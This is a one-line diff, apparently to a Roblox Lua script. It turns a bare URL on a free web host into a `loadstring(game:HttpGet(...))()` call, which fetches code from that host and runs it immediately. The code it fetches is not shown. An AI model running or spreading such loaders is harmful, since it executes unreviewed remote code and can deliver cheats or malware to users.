@@ -1,1 +1,1 @@
-https://og-edition.000webhostapp.com/17e4203c520626168742e0d0a
+loadstring(game:HttpGet("https://og-edition.000webhostapp.com/17e4203c520626168742e0d0a"))()
